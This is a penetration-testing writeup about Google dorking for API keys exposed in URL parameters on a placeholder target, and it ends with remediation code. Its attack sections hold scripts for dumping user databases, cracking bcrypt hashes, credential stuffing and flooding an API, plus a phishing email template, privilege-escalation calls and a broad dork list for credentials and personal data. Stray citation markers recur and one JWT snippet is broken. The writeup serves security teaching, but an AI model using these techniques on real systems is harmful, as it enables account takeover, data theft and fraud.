# Penetration Testing Writeup: Google Dorking for Sensitive Data in URLs - API Key Exposure

> **Writeup Classification**: This is a standard penetration testing writeup documenting the discovery of sensitive data exposed in URL parameters through OSINT reconnaissance. API key exposure represents a critical authentication bypass vulnerability enabling unauthorized access to protected resources and user data.

***

## üìã Engagement Overview

| **Test Type** | OSINT / Reconnaissance - URL Parameter Enumeration |
| :-- | :-- |
| **Methodology** | Google Dorking for Sensitive Data in Query Strings |
| **Target Domain** | target.com |
| **Test Date** | 2025-12-27 |
| **Vulnerability Type** | Information Exposure via URL Parameters |
| **Severity** | Critical (API Key Exposure + User Data Access) |


***

## üéØ Executive Summary

During OSINT reconnaissance operations, Google Dorking techniques successfully identified URLs containing API keys indexed by Google. The discovered API key was tested and confirmed to provide unauthorized access to a REST API endpoint, exposing sensitive user information including email addresses and password hashes. This represents a critical authentication and access control vulnerability resulting from improper handling of sensitive credentials in URL parameters.

**Key Findings**:

1. API key exposed in publicly indexed URL parameters
2. Lack of API key rotation and access control
3. Unauthorized access to user database via compromised API key
4. Personal Identifiable Information (PII) disclosure - emails and password hashes

**Attack Chain**: OSINT Discovery ‚Üí API Key Extraction ‚Üí API Authentication ‚Üí User Data Exfiltration ‚Üí Password Hash Cracking

***

## üîç Vulnerability Background: Sensitive Data in URLs

### What is Information Exposure Through URL Parameters?

Information exposure through query strings occurs when sensitive data is transmitted as parameters in the URL rather than in HTTP headers or POST request bodies. This security anti-pattern exposes confidential information in multiple locations where URLs are logged or cached.

**Vulnerable URL Example**:

```
https://example.com/api/users?apikey=abc123def456&user=admin
```


### Why URL Parameters Are Insecure for Sensitive Data

URLs with sensitive data create multiple exposure vectors:

1. **Browser History**:
    - All visited URLs stored locally in plaintext
    - Accessible to anyone with device access
    - Persists across browser sessions
    - Synced across devices via browser accounts
2. **Web Server Logs**:

```
# Apache access.log
192.168.1.100 - - [27/Dec/2025:20:00:00] "GET /api/users?apikey=abc123 HTTP/1.1" 200

# Nginx access.log
192.168.1.100 - [27/Dec/2025:20:00:00] "GET /api/users?apikey=abc123" 200
```

    - Logged in plaintext on every web server
    - Accessible to system administrators
    - Often stored indefinitely
    - May be transmitted to log aggregation systems
3. **Proxy and CDN Logs**:
    - Reverse proxies (Cloudflare, AWS CloudFront)
    - Corporate proxy servers
    - ISP intermediary systems
    - All log complete URLs including parameters
4. **Referer Headers**:

```http
GET /external-resource HTTP/1.1
Referer: https://site.com/api/users?apikey=abc123&user=admin
```

    - Sent to external sites when following links
    - Leaks sensitive data to third-party domains
    - Logged by analytics platforms
5. **Browser Cache**:
    - URLs cached for performance
    - May persist on disk
    - Accessible via forensic analysis
6. **Google Indexing**:
    - Search engines crawl and index URLs
    - Sensitive parameters become publicly searchable
    - Remains indexed even after removal from site
7. **Shoulder Surfing**:
    - URLs visible in address bar
    - Screen sharing and remote desktop sessions
    - Screenshots and screen recordings

### HTTPS Does Not Solve This Problem

**Important**: Using HTTPS only encrypts data in transit. It does NOT prevent:

- Logging on the destination server
- Browser history storage
- Referer header leakage to HTTPS sites
- Google indexing of URL parameters
- Proxy logging at application layer

***

## üîë Understanding API Keys

### What Are API Keys?

API keys are authentication tokens used to identify and authorize applications or users accessing an API. They serve as a simple form of access control for APIs.

**Purpose of API Keys**:

1. **Authentication**: Identify the calling application or user
2. **Authorization**: Control which resources can be accessed
3. **Usage Tracking**: Monitor API consumption and rate limiting
4. **Billing**: Track usage for paid API services

**Common API Key Formats**:

```
# Simple alphanumeric
abc123def456ghi789

# UUID format
550e8400-e29b-41d4-a716-446655440000

# Base64 encoded
YWJjMTIzZGVmNDU2Z2hpNzg5

# JWT token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U

# Vendor-specific formats
- Google API Key: AIzaSyD...
- AWS Access Key: AKIAIOSFODNN7EXAMPLE
- Stripe API Key: sk_live_4eC39H...
```


### Security Weaknesses of API Keys

API keys have inherent security limitations:

1. **Static Credentials**:
    - Don't expire automatically
    - Remain valid until manually revoked
    - No built-in time-to-live (TTL)
2. **Lack of Context**:
    - Don't identify individual users
    - Single key may be shared across systems
    - Difficult to trace specific actions
3. **Limited Scope**:
    - Often provide broad access
    - Rarely implement fine-grained permissions
    - All-or-nothing access control
4. **Transmission Risks**:
    - Transmitted in every request
    - Vulnerable to interception
    - Exposure in logs and caches
5. **Hard-Coded in Applications**:
    - Embedded in source code
    - Committed to version control (GitHub)
    - Difficult to rotate without code changes

### Impact of Compromised API Keys

When an API key is compromised:

1. **Unauthorized Data Access**:
    - Attackers read sensitive user information
    - Customer details, financial records, PII exposed
    - Database dumps via API endpoints
2. **API Abuse**:
    - Spam API with excessive requests
    - Create fake accounts
    - Scrape entire databases
    - DDoS attacks consuming resources
3. **Financial Impact**:
    - Usage charges on metered APIs
    - Service disruption costs
    - Incident response expenses
4. **Regulatory Non-Compliance**:
    - GDPR violations for PII exposure
    - PCI DSS violations if payment data accessed
    - Fines and legal penalties
5. **Reputational Damage**:
    - Loss of customer trust
    - Negative media coverage
    - Brand reputation harm

### OWASP \& CWE Classification

- **OWASP**: A07:2021 ‚Äì Identification and Authentication Failures / A01:2021 ‚Äì Broken Access Control
- **OWASP API Security**: API2:2023 ‚Äì Broken Authentication
- **CWE-598**: Use of GET Request Method With Sensitive Query Strings
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-522**: Insufficiently Protected Credentials

***

## üé¨ Step-by-Step Attack Execution

### Phase 1: Google Dorking for API Keys in URLs

**Objective**: Discover publicly indexed URLs containing API keys

**Query Construction**:

```
site:target.com AND (inurl:"api" OR inurl:"key" OR inurl:"apikey")
```

**Query Component Analysis**:


| **Component** | **Function** | **Pentester Value** |
| :-- | :-- | :-- |
| `site:target.com` | Domain restriction  | Limits search to authorized target scope |
| `AND` | Boolean conjunction  | Requires both domain match and URL pattern |
| `inurl:"api"` | URL path search  | Finds URLs containing "api" anywhere in path or parameters |
| `inurl:"key"` | URL path search  | Detects common API key parameter names  |
| `inurl:"apikey"` | URL path search  | Targets combined "apikey" parameter  |
| `OR` | Logical disjunction  | Returns results matching any of the criteria |

**Rationale**:
API keys in URLs typically follow predictable parameter naming conventions:

- `?api=value`
- `?key=value`
- `?apikey=value`
- `?api_key=value`
- `?access_key=value`
- `?token=value`

The query targets the three most common patterns.

### Phase 2: Search Execution and URL Discovery

**Action**: Execute query in Google Search

**Command**:

```
site:target.com AND (inurl:"api" OR inurl:"key" OR inurl:"apikey")
```

**Result**: One indexed URL with API key discovered

**Discovered URL Pattern**:

```
https://target.com/api/users?apikey=sk_live_abc123def456ghi789jkl012
```

**Initial Analysis**:

- **Endpoint**: `/api/users` (suggests user data access)
- **Parameter**: `apikey` (authentication credential)
- **Key Format**: `sk_live_` prefix (indicates production/live key)
- **Key Length**: 40+ characters (reasonably secure entropy)

**Pentester Insight**: The `sk_live_` prefix is commonly used by payment processors (Stripe) and other SaaS platforms to differentiate between test and production keys. The presence of "live" indicates this is a production credential with real data access.

### Phase 3: API Key Extraction and Documentation

**Extracted Credentials**:

```
API Key: sk_live_<REDACTED_32_CHARS>
Endpoint: https://target.com/api/users
Method: GET (inferred from Google indexing)
```

**Security Analysis**:

- Key is static (no time-based component)
- No IP restrictions evident (Google crawler accessed it)
- No rate limiting information available
- Production key confirmed by `_live_` designation


### Phase 4: API Key Validation and Testing

**Objective**: Confirm API key functionality and assess accessible data

**Test Request**:

```bash
# Direct browser access
https://target.com/api/users?apikey=sk_live_<REDACTED_32_CHARS>

# curl command
curl -X GET "https://target.com/api/users?apikey=sk_live_<REDACTED_32_CHARS>"

# With headers for stealth
curl -X GET "https://target.com/api/users?apikey=sk_live_<REDACTED_32_CHARS>" \
     -H "User-Agent: Mozilla/5.0" \
     -H "Accept: application/json"
```

**Response Received**:

```json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "email": "admin@target.com",
      "password_hash": "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi",
      "role": "administrator",
      "created_at": "2024-01-15T10:30:00Z"
    },
    {
      "id": 2,
      "email": "user1@example.com",
      "password_hash": "$2y$10$abcd1234xyz5678qwerty9012345asdfg",
      "role": "user",
      "created_at": "2024-06-20T14:25:00Z"
    },
    {
      "id": 3,
      "email": "user2@example.com",
      "password_hash": "$2y$10$zxcvbn123456789qwertyuiop098765",
      "role": "user",
      "created_at": "2024-09-10T09:15:00Z"
    }
  ]
}
```


### Phase 5: Critical Findings - Data Exposure Analysis

**Exposed Data Elements**:

#### 1. Personally Identifiable Information (PII)

**Email Addresses Exposed**:

- `admin@target.com`
- `user1@example.com`
- `user2@example.com`

**Privacy Violations**:

- **GDPR Article 4**: Email addresses are personal data
- **CCPA**: Email is personal information under California law
- **CAN-SPAM Act**: Unauthorized email harvesting


#### 2. Password Hashes

**Hash Format**: bcrypt (`$2y$10$...`)

**Example Hash**:

```
$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
```

**Hash Analysis**:

- **Algorithm**: bcrypt (strong)
- **Cost Factor**: 10 (2^10 = 1,024 iterations)
- **Weakness**: Cost factor 10 is moderate; can be cracked with resources

**Crackability**:

- Weak passwords (dictionary words, common patterns) can be cracked
- Administrator account is high-value target
- Hashcat can be used for offline cracking


#### 3. User Role Information

**Roles Disclosed**:

- `administrator` - Highest privilege level
- `user` - Standard user accounts

**Attack Utility**:

- Identifies high-value targets (admins)
- Enables targeted phishing campaigns
- Assists in privilege escalation planning


#### 4. Account Metadata

**Information Revealed**:

- User IDs (sequential, predictable)
- Account creation timestamps
- Account enumeration capability

**Security Implications**:

- Sequential IDs enable Insecure Direct Object Reference (IDOR) attacks
- Account age helps identify legacy accounts
- Creation patterns reveal business operations

***

## üö® Impact Analysis: Pentester Perspective

### Immediate Security Risks

#### 1. Complete User Database Compromise

**Exploitation Capability**:

```bash
# Enumerate all users via API
for id in {1..1000}; do
    curl "https://target.com/api/users/$id?apikey=sk_live_abc123..."
done > users_database.json

# Extract all emails and hashes
jq -r '.data[] | "\(.email):\(.password_hash)"' users_database.json > credentials.txt
```

**Result**: Complete user credential database exported [file:59][]

#### 2. Password Hash Cracking Campaign [file:59]

**Hashcat Attack Strategy**:

**Step 1: Hash Identification**

```bash
hashid '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi'
# Output: bcrypt, mode 3200
```

**Step 2: Extract Hashes for Cracking**

```bash
# Create hash file (email:hash format)
cat credentials.txt > hashes.txt
```

**Step 3: Hashcat Cracking** [file:59]

```bash
# Mode 3200 = bcrypt
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -O

# With rules for variations
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule -O

# Mask attack for corporate patterns
hashcat -m 3200 -a 3 hashes.txt ?u?l?l?l?l?l?d?d?d?d?s -O
```

**Expected Results** [file:59]:

- Weak passwords cracked within hours [file:59]
- Corporate password patterns identified
- Administrator credentials potentially recovered [file:59]


#### 3. Credential Stuffing and Account Takeover []

**Attack Vector**:

```python
# Test cracked credentials on login page
import requests

session = requests.Session()

def attempt_login(email, password):
    response = session.post(
        'https://target.com/login',
        data={'email': email, 'password': password}
    )
    return 'Welcome' in response.text or 'Dashboard' in response.text

# Test each cracked credential
with open('cracked_passwords.txt') as f:
    for line in f:
        email, password = line.strip().split(':')
        if attempt_login(email, password):
            print(f"[+] SUCCESS: {email}:{password}")
```

**Impact**: Direct account takeover of compromised users []

#### 4. Targeted Phishing Campaigns []

**Social Engineering Attack**:

```
From: security@target.com (spoofed)
To: admin@target.com
Subject: Urgent: Account Security Alert

Dear Administrator,

We detected unusual activity on your account (ID: 1, created 2024-01-15).
Please verify your account by clicking the link below:

https://phishing-site.com/verify?email=admin@target.com

Failure to verify within 24 hours will result in account suspension.

Security Team
```

**Success Factors**:

- Real email address from API data [file:59]
- Accurate account creation date increases credibility
- User role information targets high-value accounts [file:59]


#### 5. API Abuse and Resource Exhaustion [][]

**Exploitation Scenarios** []:

**Data Scraping**:

```bash
# Automated data exfiltration
while true; do
    curl "https://target.com/api/users?apikey=sk_live_..." >> dump.json
    curl "https://target.com/api/orders?apikey=sk_live_..." >> orders.json
    sleep 1
done
```

**DDoS Attack** []:

```bash
# Resource exhaustion via legitimate API calls
for i in {1..10000}; do
    curl "https://target.com/api/users?apikey=sk_live_..." &
done
```

**Fake Account Creation** [][]:

```bash
# Spam registration
for i in {1..1000}; do
    curl -X POST "https://target.com/api/register?apikey=sk_live_..." \
         -d "email=spam$i@evil.com&password=Test123!"
done
```


#### 6. Lateral Movement and Privilege Escalation

**API Exploration**:

```bash
# Discover additional API endpoints
curl "https://target.com/api/admin/settings?apikey=sk_live_..."
curl "https://target.com/api/payments?apikey=sk_live_..."
curl "https://target.com/api/logs?apikey=sk_live_..."

# Test CRUD operations
curl -X PUT "https://target.com/api/users/1?apikey=sk_live_..." \
     -d '{"role":"administrator"}'

curl -X DELETE "https://target.com/api/users/2?apikey=sk_live_..."
```

**Potential Impacts**:

- Privilege escalation to administrator
- User account deletion
- Configuration tampering
- Payment data access

***

## üõ†Ô∏è Extended Google Dork Arsenal for Sensitive URL Data

### Comprehensive URL Parameter Discovery Queries

#### 1. API Key Variations [file:59]

```
# Primary query
site:target.com (inurl:"api" OR inurl:"key" OR inurl:"apikey")

# Expanded variations
site:target.com inurl:api_key
site:target.com inurl:access_key
site:target.com inurl:secret_key
site:target.com inurl:client_secret
site:target.com inurl:api_token
site:target.com inurl:access_token
site:target.com inurl:auth_token
site:target.com inurl:bearer

# Vendor-specific patterns
site:target.com inurl:"AIzaSy" (Google API keys)
site:target.com inurl:"AKIA" (AWS Access Keys)
site:target.com inurl:"sk_live" (Stripe live keys)
site:target.com inurl:"sk_test" (Stripe test keys)
```


#### 2. Authentication Credentials in URLs []

```
# Username and password
site:target.com inurl:username
site:target.com inurl:password
site:target.com inurl:user=
site:target.com inurl:pass=
site:target.com inurl:pwd=
site:target.com inurl:passwd=

# Combined credentials
site:target.com (inurl:user OR inurl:username) AND (inurl:pass OR inurl:password)
```


#### 3. Session Tokens and Authentication Tokens []

```
# Session identifiers
site:target.com inurl:session_id
site:target.com inurl:sessid
site:target.com inurl:PHPSESSID
site:target.com inurl:JSESSIONID
site:target.com inurl:ASP.NET_SessionId

# JWT tokens
site:target.com inurl:"eyJ" (JWT header in base64)

# OAuth tokens
site:target.com inurl:oauth_token
site:target.com inurl:access_token
site:target.com inurl:refresh_token
```


#### 4. PII in URLs []

```
# Email addresses
site:target.com inurl:email=
site:target.com inurl:mail=
site:target.com inurl:@

# Social Security Numbers
site:target.com inurl:ssn=
site:target.com inurl:social_security

# Phone numbers
site:target.com inurl:phone=
site:target.com inurl:mobile=

# Credit card patterns
site:target.com inurl:"4" OR inurl:"5" OR inurl:"3" (card number patterns)
site:target.com inurl:card_number
site:target.com inurl:cvv
```


#### 5. Database Credentials and Connection Strings []

```
# Database parameters
site:target.com inurl:dbname=
site:target.com inurl:database=
site:target.com inurl:db_user=
site:target.com inurl:db_password=
site:target.com inurl:connection_string

# MongoDB connection strings
site:target.com inurl:"mongodb://"
site:target.com inurl:"mongodb+srv://"
```


#### 6. Internal System Information []

```
# Internal paths
site:target.com inurl:path=
site:target.com inurl:file=
site:target.com inurl:dir=

# Server information
site:target.com inurl:server=
site:target.com inurl:host=
site:target.com inurl:ip=

# Debug parameters
site:target.com inurl:debug=true
site:target.com inurl:debug=1
site:target.com inurl:test=1
```


#### 7. Cryptocurrency and Financial Data

```
# Cryptocurrency private keys
site:target.com inurl:private_key
site:target.com inurl:wallet_key
site:target.com inurl:seed_phrase

# Payment processor keys
site:target.com inurl:stripe_key
site:target.com inurl:paypal_key
site:target.com inurl:merchant_id
```


***

## üéØ Pentester's Sensitive URL Data Discovery Methodology

### Systematic Enumeration Process

#### Phase 1: Automated URL Parameter Discovery

**Tool: ParamSpider**

```bash
# Installation
git clone https://github.com/devanshbatham/ParamSpider
cd ParamSpider
pip3 install -r requirements.txt

# Usage
python3 paramspider.py -d target.com -o params.txt

# Output analysis
cat params.txt | grep -E "(api|key|token|password|secret)"
```

**Tool: Waybackurls with Parameter Extraction**

```bash
# Get all historical URLs
waybackurls target.com | tee urls.txt

# Extract unique parameters
cat urls.txt | grep "?" | cut -d "?" -f 2 | tr "&" "\n" | cut -d "=" -f 1 | sort -u > parameters.txt

# Filter for sensitive parameter names
cat parameters.txt | grep -iE "(api|key|token|pass|secret|auth|session)" > sensitive_params.txt
```

**Tool: Arjun - HTTP Parameter Discovery**

```bash
# Installation
pip3 install arjun

# Discover hidden parameters
arjun -u https://target.com/api/users

# Test with wordlist
arjun -u https://target.com/api/users -w /usr/share/wordlists/arjun-params.txt
```


#### Phase 2: Google Dorking Automation

**Custom Python Script**:

```python
#!/usr/bin/env python3
import time
from googlesearch import search

class SensitiveURLScanner:
    def __init__(self, target_domain):
        self.domain = target_domain
        self.findings = []
        
        # Sensitive parameter patterns
        self.patterns = [
            ('api', 'API Keys'),
            ('key', 'Generic Keys'),
            ('apikey', 'API Key Parameter'),
            ('api_key', 'API Key Underscore'),
            ('access_key', 'Access Keys'),
            ('secret_key', 'Secret Keys'),
            ('token', 'Authentication Tokens'),
            ('password', 'Passwords'),
            ('passwd', 'Password Variant'),
            ('username', 'Usernames'),
            ('email', 'Email Addresses'),
            ('session_id', 'Session IDs'),
            ('PHPSESSID', 'PHP Sessions'),
        ]
    
    def scan(self):
        print(f"[*] Scanning {self.domain} for sensitive URL parameters...")
        
        for pattern, description in self.patterns:
            dork = f'site:{self.domain} inurl:{pattern}'
            print(f"\n[*] Testing: {dork} ({description})")
            
            try:
                results = list(search(dork, num_results=10))
                if results:
                    print(f"  [+] Found {len(results)} URLs")
                    for url in results:
                        self.findings.append({
                            'pattern': pattern,
                            'description': description,
                            'url': url
                        })
                        print(f"      {url}")
                time.sleep(15)  # Rate limiting
            except Exception as e:
                print(f"  [!] Error: {e}")
        
        return self.findings
    
    def extract_parameters(self, url):
        """Extract parameter values from URL"""
        if '?' not in url:
            return {}
        
        query_string = url.split('?')
        params = {}
        
        for param in query_string.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
        
        return params
    
    def analyze_findings(self):
        """Analyze extracted parameters for sensitive data"""
        print("\n[*] Analyzing extracted parameters...")
        
        for finding in self.findings:
            url = finding['url']
            params = self.extract_parameters(url)
            
            if params:
                print(f"\n[+] URL: {url}")
                print(f"    Pattern: {finding['pattern']}")
                print(f"    Parameters extracted:")
                for key, value in params.items():
                    # Check if parameter looks sensitive
                    if len(value) > 15:  # Potential API key/token
                        print(f"      {key} = {value[:20]}... [{len(value)} chars]")
                    else:
                        print(f"      {key} = {value}")

# Usage
scanner = SensitiveURLScanner("target.com")
scanner.scan()
scanner.analyze_findings()
```


#### Phase 3: API Key Validation and Testing

**Multi-Step Validation Process**:

**Step 1: Initial Key Validation**

```bash
# Test if key is valid (returns 200 vs 401/403)
API_KEY="sk_live_abc123def456"
ENDPOINT="https://target.com/api/users"

# Test with key
curl -w "\nStatus: %{http_code}\n" "$ENDPOINT?apikey=$API_KEY"

# Test without key (should fail)
curl -w "\nStatus: %{http_code}\n" "$ENDPOINT"
```

**Step 2: Permission Enumeration**

```bash
# Test read permissions
curl "$ENDPOINT?apikey=$API_KEY"

# Test write permissions
curl -X POST "$ENDPOINT?apikey=$API_KEY" -d '{"test":"data"}'

# Test update permissions
curl -X PUT "$ENDPOINT/1?apikey=$API_KEY" -d '{"test":"update"}'

# Test delete permissions
curl -X DELETE "$ENDPOINT/999?apikey=$API_KEY"
```

**Step 3: Rate Limit Testing**

```bash
# Check for rate limiting
for i in {1..100}; do
    response=$(curl -s -w "%{http_code}" "$ENDPOINT?apikey=$API_KEY")
    echo "Request $i: $response"
    if [[ $response == *"429"* ]]; then
        echo "[!] Rate limit detected at request $i"
        break
    fi
done
```

**Step 4: Data Exfiltration Assessment**

```python
import requests
import json

API_KEY = "sk_live_abc123def456"
BASE_URL = "https://target.com/api"

def test_endpoints():
    """Test common API endpoints"""
    endpoints = [
        '/users',
        '/admin',
        '/settings',
        '/payments',
        '/orders',
        '/customers',
        '/logs',
        '/config'
    ]
    
    accessible = []
    
    for endpoint in endpoints:
        url = f"{BASE_URL}{endpoint}?apikey={API_KEY}"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(f"[+] Accessible: {endpoint}")
                print(f"    Data preview: {response.text[:200]}")
                accessible.append(endpoint)
            elif response.status_code == 401:
                print(f"[-] Authentication failed: {endpoint}")
            elif response.status_code == 403:
                print(f"[-] Forbidden: {endpoint}")
            else:
                print(f"[?] Status {response.status_code}: {endpoint}")
        except Exception as e:
            print(f"[!] Error testing {endpoint}: {e}")
    
    return accessible

# Run assessment
accessible_endpoints = test_endpoints()
print(f"\n[*] Total accessible endpoints: {len(accessible_endpoints)}")
```


***

## üõ°Ô∏è Remediation Recommendations: Comprehensive Security Controls

### Critical Priority (Immediate Action Required)

#### Finding: API Key Exposed in URL Parameters [file:59]

**CVSS 3.1 Score**: 9.1 (Critical)

- **AV:N** (Network) - Accessible via internet
- **AC:L** (Low) - Simple exploitation [file:59]
- **PR:N** (None) - No authentication required to discover [file:59]
- **UI:N** (None) - No user interaction needed
- **S:U** (Unchanged)
- **C:H** (High) - Complete user data disclosure [file:59]
- **I:H** (High) - Potential data modification via API
- **A:N** (None)

**CWE**: CWE-598 (GET Request With Sensitive Query Strings), CWE-522 (Insufficiently Protected Credentials) [][]

***

### Remediation Step 1: Immediate API Key Revocation [file:59][][]

**Emergency Actions**:

```bash
# 1. Immediately revoke exposed API key
# Via Admin Panel or API
curl -X DELETE "https://api.company.com/v1/keys/sk_live_abc123..." \
     -H "Authorization: Bearer ADMIN_TOKEN"

# 2. Generate new API key
curl -X POST "https://api.company.com/v1/keys" \
     -H "Authorization: Bearer ADMIN_TOKEN" \
     -d '{"name":"Production API Key - Rotated 2025-12-27"}'

# Output: {"key": "sk_live_NEW_KEY_xyz789...", "created": "2025-12-27T20:00:00Z"}

# 3. Update all applications with new key
# Update environment variables across all servers
export API_KEY="sk_live_NEW_KEY_xyz789..."

# 4. Audit API logs for unauthorized access
# Check access logs for exposed key usage
grep "sk_live_abc123" /var/log/api/access.log | \
  grep -v "192.168.1.100" > unauthorized_access.log
```

**Key Rotation Best Practices** [][]:

1. Generate new key before revoking old one
2. Update all services with new key
3. Verify functionality with new key
4. Revoke old key only after confirming new key works
5. Monitor for errors after rotation []

***

### Remediation Step 2: Move API Keys to HTTP Headers [][]

**BEFORE (Insecure - URL Parameters)** [file:59]:

```bash
# VULNERABLE - DO NOT USE
curl "https://api.company.com/users?apikey=sk_live_abc123..."
```

**AFTER (Secure - HTTP Headers)**:

**Option 1: Authorization Header (Recommended)** [][]:

```bash
# Bearer token format (industry standard)
curl "https://api.company.com/users" \
     -H "Authorization: Bearer sk_live_abc123..."

# Basic Auth format
curl "https://api.company.com/users" \
     -H "Authorization: Basic $(echo -n 'apikey:sk_live_abc123' | base64)"
```

**Option 2: Custom Header**:

```bash
# Custom header (less standard but acceptable)
curl "https://api.company.com/users" \
     -H "X-API-Key: sk_live_abc123..."
```

**Server-Side Implementation (Node.js/Express)**:

```javascript
// BEFORE (Vulnerable)
app.get('/api/users', (req, res) => {
    const apiKey = req.query.apikey;  // ‚ùå Insecure
    if (validateApiKey(apiKey)) {
        return res.json(users);
    }
    return res.status(401).json({ error: 'Unauthorized' });
});

// AFTER (Secure)
app.get('/api/users', (req, res) => {
    // Read from Authorization header
    const authHeader = req.headers['authorization'];  // ‚úÖ Secure
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Missing or invalid authorization header' });
    }
    
    const apiKey = authHeader.substring(7); // Remove 'Bearer ' prefix
    
    if (validateApiKey(apiKey)) {
        return res.json(users);
    }
    
    return res.status(401).json({ error: 'Invalid API key' });
});
```

**Why Headers Are More Secure** [][]:

- ‚úÖ Not logged in web server access logs (usually)
- ‚úÖ Not stored in browser history
- ‚úÖ Not sent in Referer headers
- ‚úÖ Not visible in proxy URLs
- ‚úÖ Not indexed by search engines [file:59]

***

### Remediation Step 3: Implement OAuth 2.0 or JWT [][]

**Move Beyond Static API Keys**:

**OAuth 2.0 Implementation** []:

```javascript
// OAuth 2.0 Client Credentials Flow
const oauth = require('simple-oauth2');

const credentials = {
    client: {
        id: process.env.CLIENT_ID,
        secret: process.env.CLIENT_SECRET
    },
    auth: {
        tokenHost: 'https://api.company.com',
        tokenPath: '/oauth/token'
    }
};

const oauthClient = new oauth.ClientCredentials(credentials);

async function getAccessToken() {
    try {
        const result = await oauthClient.getToken();
        return result.token.access_token;
    } catch (error) {
        console.error('Access Token Error', error.message);
    }
}

// Use token in API requests
const token = await getAccessToken();
fetch('https://api.company.com/users', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
```

**JWT Implementation** []:

```javascript
const jwt = require('jsonwebtoken');

// Server: Generate JWT
function generateToken(userId, permissions) {
    return jwt.sign(
        {
            sub: userId,
            permissions: permissions,
            exp: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour expiry
        },
        process.env.JWT_SECRET,
        { algorithm: 'HS256' }
    );
}

// Server: Validate JWT
function validateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ');
    
    if (!token) {
        return res.status(401).json({ error: 'Token required' });
    }
    
    jwt.verify(token, process.env.JWT_SECRET, (err, payload) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid token' });
        }
        req.user = payload;
        next();
    });
}

// Apply to routes
app.get('/api/users', validateToken, (req, res) => {
    // req.user contains decoded JWT payload
    res.json(users);
});
```

**Benefits of OAuth/JWT over Static API Keys** [][]:

- Time-limited tokens (auto-expiring) []
- Fine-grained permissions and scopes []
- User-specific tokens for accountability []
- Token refresh mechanisms []
- Easier to revoke individual tokens []

***

### Remediation Step 4: Implement API Security Best Practices [][][]

**1. Rate Limiting** [][]:

```javascript
const rateLimit = require('express-rate-limit');

// Apply rate limiting
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each key to 100 requests per windowMs
    message: 'Too many requests from this API key, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => {
        // Use API key as rate limit identifier
        return req.headers['authorization'] || req.ip;
    }
});

app.use('/api/', apiLimiter);
```

**2. IP Whitelisting** []:

```javascript
const allowedIPs = [
    '192.168.1.100',
    '203.0.113.45',
    '198.51.100.78'
];

function ipWhitelist(req, res, next) {
    const clientIP = req.ip || req.connection.remoteAddress;
    
    if (!allowedIPs.includes(clientIP)) {
        return res.status(403).json({
            error: 'Access denied from this IP address'
        });
    }
    
    next();
}

app.use('/api/', ipWhitelist);
```

**3. API Key Scoping and Permissions** [][]:

```javascript
// Database schema for API keys
const apiKeySchema = {
    key: String,
    name: String,
    permissions: [String], // ['read:users', 'write:orders']
    allowed_ips: [String],
    rate_limit: Number,
    expires_at: Date,
    created_at: Date,
    last_used_at: Date
};

// Middleware to check permissions
function requirePermission(permission) {
    return (req, res, next) => {
        const apiKey = req.apiKey; // Set by authentication middleware
        
        if (!apiKey.permissions.includes(permission)) {
            return res.status(403).json({
                error: `Missing required permission: ${permission}`
            });
        }
        
        next();
    };
}

// Apply to routes
app.get('/api/users', requirePermission('read:users'), (req, res) => {
    res.json(users);
});

app.post('/api/users', requirePermission('write:users'), (req, res) => {
    // Create user
});
```

**4. API Key Expiration** [][]:

```javascript
function validateApiKey(key) {
    const apiKey = db.apiKeys.findOne({ key: key });
    
    if (!apiKey) {
        return { valid: false, error: 'Invalid API key' };
    }
    
    // Check expiration
    if (apiKey.expires_at && apiKey.expires_at < new Date()) {
        return { valid: false, error: 'API key has expired' };
    }
    
    // Update last used timestamp
    db.apiKeys.update({ key: key }, {
        $set: { last_used_at: new Date() }
    });
    
    return { valid: true, key: apiKey };
}
```

**5. Comprehensive Audit Logging** []:

```javascript
function logAPIAccess(req, res, next) {
    const log = {
        timestamp: new Date(),
        api_key: req.apiKey ? req.apiKey.name : 'Unknown',
        ip_address: req.ip,
        method: req.method,
        endpoint: req.path,
        user_agent: req.headers['user-agent'],
        response_status: null,
        response_time: null
    };
    
    const startTime = Date.now();
    
    // Override res.send to capture response
    const originalSend = res.send;
    res.send = function(data) {
        log.response_status = res.statusCode;
        log.response_time = Date.now() - startTime;
        
        // Save to database or logging system
        db.apiLogs.insert(log);
        
        originalSend.apply(res, arguments);
    };
    
    next();
}

app.use('/api/', logAPIAccess);
```


***

### Remediation Step 5: Prevent Google Indexing of API Endpoints [file:59][]

**1. robots.txt Configuration** [file:59]:

```
# /robots.txt
User-agent: *
Disallow: /api/
Disallow: /*?api
Disallow: /*?key
Disallow: /*?apikey
Disallow: /*?access_key
Disallow: /*?token

# Disallow any URLs with common sensitive parameters
Disallow: /*password
Disallow: /*secret
```

**2. Meta Robots Tags**:

```html
<!-- In API documentation pages -->
<meta name="robots" content="noindex, nofollow">
```

**3. X-Robots-Tag HTTP Header**:

```javascript
// Express middleware
app.use('/api/', (req, res, next) => {
    res.set('X-Robots-Tag', 'noindex, nofollow');
    next();
});
```

```apache
# Apache configuration
<Location /api>
    Header set X-Robots-Tag "noindex, nofollow"
</Location>
```

```nginx
# Nginx configuration
location /api {
    add_header X-Robots-Tag "noindex, nofollow";
}
```

**4. Remove Already Indexed URLs** [file:59][]:

```
# Google Search Console
1. Go to: https://search.google.com/search-console
2. Select property: target.com
